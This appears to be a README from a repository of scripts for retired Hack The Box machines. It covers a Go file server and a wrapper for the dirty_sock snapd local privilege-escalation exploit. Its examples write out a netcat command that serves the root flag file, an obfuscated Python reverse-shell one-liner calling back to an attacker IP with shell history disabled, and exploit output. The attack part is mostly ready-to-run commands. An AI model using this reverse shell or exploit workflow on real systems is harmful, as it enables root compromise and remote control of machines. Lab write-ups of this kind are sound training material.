# Golang HTTP Fileserver

## Build

```
git clone https://github.com/epi052/htb-scripts-for-retired-boxes.git
cd htb-scripts-for-retired-boxes/curling
go build go-serve.go
```

## Examples

Start a listener on port 8000 (default) serving files from the cwd.

`./go-serve`

Start a listener on a given port serving files from the cwd.

`./go-serve 80`

# the-other-dirty-sock.py

## General Steps

1. Run `the-other-dirty-sock.py` in the same directory as `dirty_sockv2.py`
2. Copy/upload `modified-dirty_sockv2.py` to target
3. Run `modified-dirty_sockv2.py` on target

## Gotchas

Snap packages execute in what amounts to a chroot.  They have a very limited idea of the host OS's filesystem.  There are a few locations it can still write to, but by and large, they can't manipulate the host filesystem.  This is important when deciding what command you want to execute.  

For instance, `cat /root/root.txt > /tmp/flag` will create the flag file in the Snap's filesystem, not in the host's /tmp folder.  

## Examples

### Listen and Serve root Flag

Generate a Snap that executes a simple command.

`python3 the-other-dirty-sock.py -c "nc -nvlp 31337 < /root/root.txt"`

Copy/upload `modified-dirty_sockv2.py` to target.  Once on target, execute the script.  In this example, the script fails when trying to delete the Snap.  This is because it's still listening on port 31337 and can't be deleted while it's running.

```
      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/eyxfrvcupo;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[!] Did not work, here is the API reply:


HTTP/1.1 400 Bad Request
Content-Type: application/json
Date: Sat, 30 Mar 2019 02:03:29 GMT
Content-Length: 198

{"type":"error","status-code":400,"status":"Bad Request","result":{"message":"cannot remove \"other-dirty-sockcw6fneng\": snap \"other-dirty-sockcw6fneng\" has \"install-snap\" change in progress"}}
```

Connect to listener on 31337.

```
┌(kail)─(09:20 PM Fri Mar 29)
└─(curling)─> nc -vn 10.10.10.150 31337
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.10.150:31337.
82c198ab6fc5365fdc6da2ee5c26064a
```

### Python Reverse Shell Payload

Create a bash script that contains a python reverse shell command.

```
#!/bin/bash

python3 -c "import os;import pty;import socket;vFKTJAVPnDYYHc='10.10.14.16';kKVXHQZGlLwhfd=12345;lBVbuY=socket.socket(socket.AF_INET,socket.SOCK_STREAM);lBVbuY.connect((vFKTJAVPnDYYHc,kKVXHQZGlLwhfd));os.dup2(lBVbuY.fileno(),0);os.dup2(lBVbuY.fileno(),1);os.dup2(lBVbuY.fileno(),2);os.putenv('HISTFILE','/dev/null');pty.spawn('/bin/bash');lBVbuY.close();"
```

Generate a Snap that reads in the shell script to use as its payload.

`python3 the-other-dirty-sock.py -f callback.sh`

Start a local listener.

`nc -vnlp 12345`

Copy/upload `modified-dirty_sockv2.py` to target.  Once on target, execute the script.  In this example, the script fails when trying to delete the Snap.  This is because it's still connected to us on port 12345.

```
      ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
      |  \ | |__/  |   \_/      [__  |  | |    |_/  
      |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                       (version 2)

//=========[]==========================================\\
|| R&D     || initstring (@init_string)                ||
|| Source  || https://github.com/initstring/dirty_sock ||
|| Details || https://initblog.com/2019/dirty-sock     ||
\\=========[]==========================================//


[+] Slipped dirty sock on random socket file: /tmp/eyxfrvcupo;uid=0;
[+] Binding to socket file...
[+] Connecting to snapd API...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[+] Installing the trojan snap (and sleeping 8 seconds)...
[+] Deleting trojan snap (and sleeping 5 seconds)...
[!] Did not work, here is the API reply:


HTTP/1.1 400 Bad Request
Content-Type: application/json
Date: Sat, 30 Mar 2019 02:03:29 GMT
Content-Length: 198

{"type":"error","status-code":400,"status":"Bad Request","result":{"message":"cannot remove \"other-dirty-sockcw6fneng\": snap \"other-dirty-sock_4371neng\" has \"install-snap\" change in progress"}}
```

